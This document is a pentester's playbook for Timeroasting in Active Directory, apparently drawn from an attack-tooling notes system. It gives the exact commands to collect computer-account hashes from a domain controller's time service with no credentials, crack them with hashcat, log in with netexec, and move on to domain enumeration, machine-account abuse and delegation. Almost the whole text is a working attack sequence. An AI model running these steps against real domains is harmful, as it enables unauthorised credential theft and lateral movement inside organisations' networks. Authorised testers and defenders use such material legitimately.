# Timeroasting

## Before I start
- [ ] UDP 123 open on the DC, which it usually is as the domain's time source
- [ ] No credentials needed: MS-SNTP answers a query for any RID with no login

## Collect
timeroast.py, from https://github.com/bvcyber/Timeroast:
git clone https://github.com/bvcyber/Timeroast
python3 Timeroast/timeroast.py <DCIP> -o timeroast.hashes
- [ ] Each line is an NTP answer signed with one computer account's NT hash, so a hash to crack for that account
- [ ] The RIDs walk the whole domain, but only computer and trust accounts answer, not users
- [ ] Answers lost on a slow link: --rate 24, in place of the default 180 queries a second

## Crack
hashcat -m 31300 --username timeroast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 31300 --username timeroast.hashes --show
- [ ] A normal computer password is 120 random characters and will not crack
- [ ] What cracks: a machine password set by hand, a cloned image with an old password, and an account whose password never changes

## Use a cracked machine account
At the pwn-broker prompt: tool install netexec.
With <Computer> the account for the RID that cracked:
nxc smb <DCIP> -d <Domain> -u '<Computer>' -p 'THE-CRACKED-PASSWORD'
- [ ] A machine credential is a domain login: enumeration and BloodHound, :Pb domain-enum
- [ ] Old machine accounts sometimes keep ACLs worth having: BloodHound, from that account

## If it fails
- [ ] No hashes: UDP 123 filtered, or this DC is not a time server, so the PDC emulator
- [ ] Nothing cracks: expected in a healthy domain, so the file kept for better rules and targeted lists later

## Next
- [ ] Any machine credential: :Pb machine-account-abuse, and delegation from it, :Pb delegation
- [ ] The hashes that did not crack kept for a later mask attack
